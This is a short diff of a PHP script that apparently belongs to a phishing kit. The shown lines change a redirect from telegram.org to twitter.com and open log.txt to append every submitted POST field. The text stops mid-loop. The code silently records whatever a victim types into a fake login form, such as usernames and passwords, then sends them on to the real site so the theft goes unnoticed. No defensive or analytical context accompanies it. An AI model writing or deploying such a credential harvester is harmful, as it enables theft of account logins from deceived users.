@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://telegram.org');
+header ('Location: https://twitter.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
